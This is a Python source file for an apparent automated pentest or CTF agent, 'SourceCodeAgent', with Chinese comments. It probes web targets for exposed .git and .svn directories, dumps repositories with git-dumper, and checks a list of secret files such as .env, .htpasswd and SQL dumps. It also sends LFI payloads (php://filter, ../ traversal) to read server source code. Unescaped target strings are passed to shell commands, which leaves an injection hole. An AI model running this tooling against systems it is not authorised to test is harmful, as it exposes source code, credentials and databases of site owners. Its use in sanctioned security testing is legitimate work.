#!/usr/bin/env python3
"""
SourceCodeAgent - 源码获取智能体 (v5.0)

负责从目标获取源代码：
- .git泄露检测和下载 (git-dumper)
- SVN泄露检测
- 备份文件识别 (.bak/.zip/.tar.gz/.sql)
- LFI批量读取源码
- 源码目录结构分析
- 语言和框架识别

集成工具：6个
"""

import os
import logging
import re
from typing import Dict, List, Any, Optional
from datetime import datetime

from kali_mcp.agents.base_agent_v2 import BaseAgentV2, AgentCapability
from kali_mcp.core.task_decomposer import Task, TaskCategory
from kali_mcp.core.result_aggregator import (
    AgentResult, Finding, ResultType, ResultSeverity
)

logger = logging.getLogger(__name__)


class SourceCodeAgent(BaseAgentV2):
    """
    源码获取智能体

    专门负责从目标获取源代码，包括：
    - git_dump: 检测和下载.git泄露
    - svn_dump: 检测和下载.svn泄露
    - backup_scan: 扫描备份文件
    - lfi_source_read: 通过LFI读取源码
    - analyze_source_structure: 分析源码结构
    - detect_tech_stack: 识别技术栈
    """

    # 常见备份文件路径
    BACKUP_PATHS = [
        ".git/HEAD", ".git/config", ".svn/entries", ".svn/wc.db",
        ".DS_Store", ".env", ".env.bak", "web.config", "wp-config.php",
        "config.php.bak", "config.php~", "config.php.old",
        "database.sql", "dump.sql", "backup.sql", "db.sql",
        "backup.zip", "backup.tar.gz", "site.zip", "www.zip",
        ".htaccess", ".htpasswd", "robots.txt", "sitemap.xml",
        "composer.json", "package.json", "requirements.txt", "Gemfile",
        "Dockerfile", "docker-compose.yml", ".gitignore",
        "README.md", "CHANGELOG.md", "LICENSE",
    ]

    # 技术栈识别规则
    TECH_SIGNATURES = {
        "php": {"files": ["index.php", "wp-config.php", "composer.json"], "headers": ["X-Powered-By: PHP"]},
        "python": {"files": ["requirements.txt", "setup.py", "app.py", "manage.py"], "headers": ["X-Powered-By: Python"]},
        "nodejs": {"files": ["package.json", "node_modules", "app.js"], "headers": ["X-Powered-By: Express"]},
        "java": {"files": ["pom.xml", "build.gradle", "WEB-INF"], "headers": ["X-Powered-By: Servlet"]},
        "ruby": {"files": ["Gemfile", "config.ru", "Rakefile"], "headers": ["X-Powered-By: Phusion"]},
        "asp.net": {"files": ["web.config", "Global.asax"], "headers": ["X-Powered-By: ASP.NET"]},
        "go": {"files": ["go.mod", "go.sum", "main.go"], "headers": []},
    }

    def __init__(self, message_bus=None, tool_registry=None, executor=None):
        capabilities = AgentCapability(
            name="source_code_acquisition",
            category="specialized",
            supported_tools={
                "git_dump", "svn_dump", "backup_scan",
                "lfi_source_read", "analyze_source_structure",
                "detect_tech_stack",
            },
            max_concurrent_tasks=3,
            specialties=[
                "source_code", "git_leak", "backup_discovery",
                "lfi", "tech_stack", "recon"
            ]
        )

        super().__init__(
            agent_id="source_code_agent",
            name="Source Code Agent",
            message_bus=message_bus,
            capabilities=capabilities,
            tool_registry=tool_registry,
            executor=executor
        )
        logger.info("SourceCodeAgent初始化完成")

    # ==================== BaseAgent抽象方法实现 ====================

    def handle_message(self, message):
        from kali_mcp.core.ctf_agent_framework import MessageType
        logger.info(f"[{self.agent_id}] 收到消息: {message.type.value}")

    async def run(self, context):
        logger.info(f"[{self.agent_id}] 开始源码获取")
        target = context.parameters.get("target", "") if hasattr(context, 'parameters') else ""
        if not target:
            return {"success": False, "error": "未指定目标"}
        try:
            result = await self.full_source_scan(target)
            return {"success": True, "result": result}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def _execute_task_impl(self, task_type: str, task_data: Dict, task_id: str):
        target = task_data.get("target", "")
        if task_type == "git_dump":
            return await self.check_git_leak(target)
        elif task_type == "backup_scan":
            return await self.scan_backup_files(target)
        elif task_type == "lfi_source_read":
            return await self.lfi_read_source(target, task_data.get("file_path", ""))
        elif task_type == "analyze_source_structure":
            return await self.analyze_structure(task_data.get("source_path", ""))
        elif task_type == "detect_tech_stack":
            return await self.detect_tech(target)
        else:
            return await self.full_source_scan(target)

    # ==================== Task对象支持 ====================

    async def execute_task_with_task_obj(self, task: Task) -> AgentResult:
        start_time = datetime.now()
        output = ""
        findings = []
        success = False

        try:
            result = await self._execute_task_impl(
                task.tool_name, task.parameters, task.task_id
            )
            if isinstance(result, dict):
                output = str(result)
                success = result.get("success", True)
                for item in result.get("findings", []):
                    findings.append(Finding(
                        title=item.get("title", ""),
                        description=item.get("description", ""),
                        severity=ResultSeverity.MEDIUM,
                        result_type=ResultType.INFORMATION,
                        evidence=item.get("evidence", ""),
                    ))
            else:
                output = str(result)
                success = True
        except Exception as e:
            output = str(e)

        return AgentResult(
            agent_id=self.agent_id,
            task_id=task.task_id,
            tool_name=task.tool_name,
            target=task.parameters.get("target", ""),
            success=success,
            execution_time=(datetime.now() - start_time).total_seconds(),
            output=output,
            findings=findings,
        )

    # ==================== 核心功能 ====================

    async def check_git_leak(self, target: str) -> Dict[str, Any]:
        """检测.git泄露"""
        url = target.rstrip("/")
        findings = []

        # 检测 .git/HEAD
        cmd = f"curl -s -o /dev/null -w '%{{http_code}}' -m 10 '{url}/.git/HEAD'"
        result = self._execute_cmd(cmd)
        status = result.get("output", "").strip().strip("'")

        if status == "200":
            # 确认是git仓库
            cmd2 = f"curl -s -m 10 '{url}/.git/HEAD'"
            head_content = self._execute_cmd(cmd2).get("output", "")
            if "ref:" in head_content:
                findings.append({
                    "title": ".git目录泄露",
                    "description": f"目标存在.git泄露: {url}/.git/HEAD",
                    "evidence": head_content.strip(),
                    "type": "source_leak",
                })

                # 尝试用git-dumper下载
                dump_dir = f"/tmp/git_dump_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
                dump_cmd = f"git-dumper '{url}/.git/' '{dump_dir}' 2>&1 | head -20"
                dump_result = self._execute_cmd(dump_cmd, timeout=60)
                if dump_result.get("success"):
                    findings.append({
                        "title": "Git仓库已下载",
                        "description": f"源码已下载到: {dump_dir}",
                        "evidence": dump_result.get("output", "")[:500],
                    })

        return {"success": True, "git_leak": len(findings) > 0, "findings": findings}

    async def scan_backup_files(self, target: str) -> Dict[str, Any]:
        """扫描备份文件"""
        url = target.rstrip("/")
        found = []

        for path in self.BACKUP_PATHS:
            cmd = f"curl -s -o /dev/null -w '%{{http_code}}' -m 5 '{url}/{path}'"
            result = self._execute_cmd(cmd, timeout=10)
            status = result.get("output", "").strip().strip("'")
            if status in ("200", "403"):
                found.append({
                    "path": f"/{path}",
                    "status": int(status),
                    "accessible": status == "200",
                })

        findings = []
        for f in found:
            if f["accessible"]:
                findings.append({
                    "title": f"备份文件发现: {f['path']}",
                    "description": f"HTTP {f['status']} - {url}{f['path']}",
                    "evidence": f"Status: {f['status']}",
                    "type": "backup_file",
                })

        return {"success": True, "found_count": len(found), "files": found, "findings": findings}

    async def lfi_read_source(self, target: str, file_path: str) -> Dict[str, Any]:
        """通过LFI读取源码"""
        if not file_path:
            return {"success": False, "error": "未指定文件路径"}

        # 常见LFI payload
        payloads = [
            f"php://filter/convert.base64-encode/resource={file_path}",
            f"....//....//....//....//..../{file_path}",
            f"..%2f..%2f..%2f..%2f..%2f{file_path}",
        ]

        results = []
        for payload in payloads:
            cmd = f"curl -s -m 10 '{target}?file={payload}'"
            result = self._execute_cmd(cmd, timeout=15)
            output = result.get("output", "")
            if output and len(output) > 10 and "<html" not in output[:100].lower():
                results.append({"payload": payload, "output": output[:2000]})

        return {"success": True, "results": results}

    async def detect_tech(self, target: str) -> Dict[str, Any]:
        """检测技术栈"""
        url = target.rstrip("/")
        detected = []

        # 通过HTTP头检测
        cmd = f"curl -s -I -m 10 '{url}'"
        result = self._execute_cmd(cmd, timeout=15)
        headers = result.get("output", "")

        for tech, sigs in self.TECH_SIGNATURES.items():
            for header_sig in sigs.get("headers", []):
                if header_sig.lower() in headers.lower():
                    detected.append({"tech": tech, "source": "header", "evidence": header_sig})

        # 通过文件存在性检测
        for tech, sigs in self.TECH_SIGNATURES.items():
            for f in sigs.get("files", [])[:2]:
                cmd = f"curl -s -o /dev/null -w '%{{http_code}}' -m 5 '{url}/{f}'"
                r = self._execute_cmd(cmd, timeout=10)
                status = r.get("output", "").strip().strip("'")
                if status == "200":
                    detected.append({"tech": tech, "source": "file", "evidence": f})
                    break

        return {"success": True, "detected": detected}

    async def analyze_structure(self, source_path: str) -> Dict[str, Any]:
        """分析源码目录结构"""
        if not source_path or not os.path.exists(source_path):
            return {"success": False, "error": f"路径不存在: {source_path}"}

        cmd = f"find '{source_path}' -type f | head -200"
        result = self._execute_cmd(cmd, timeout=30)
        files = [l for l in result.get("output", "").split("\n") if l.strip()]

        # 统计文件类型
        ext_count = {}
        for f in files:
            ext = os.path.splitext(f)[1].lower() or "(no ext)"
            ext_count[ext] = ext_count.get(ext, 0) + 1

        # 识别语言
        lang_map = {
            ".py": "Python", ".php": "PHP", ".js": "JavaScript",
            ".java": "Java", ".rb": "Ruby", ".go": "Go",
            ".c": "C", ".cpp": "C++", ".cs": "C#",
        }
        languages = {}
        for ext, count in ext_count.items():
            if ext in lang_map:
                languages[lang_map[ext]] = count

        return {
            "success": True,
            "total_files": len(files),
            "file_types": dict(sorted(ext_count.items(), key=lambda x: -x[1])[:15]),
            "languages": languages,
            "primary_language": max(languages, key=languages.get) if languages else "unknown",
        }

    async def full_source_scan(self, target: str) -> Dict[str, Any]:
        """完整源码获取扫描"""
        results = {
            "target": target,
            "git_leak": await self.check_git_leak(target),
            "backup_files": await self.scan_backup_files(target),
            "tech_stack": await self.detect_tech(target),
        }
        return results

    # ==================== 辅助方法 ====================

    def _execute_cmd(self, cmd: str, timeout: int = 30) -> Dict[str, Any]:
        """通过executor执行命令"""
        if self.executor is None:
            return {"success": False, "output": "", "error": "No executor"}
        try:
            return self.executor.execute_command(cmd, timeout=timeout)
        except Exception as e:
            return {"success": False, "output": "", "error": str(e)}
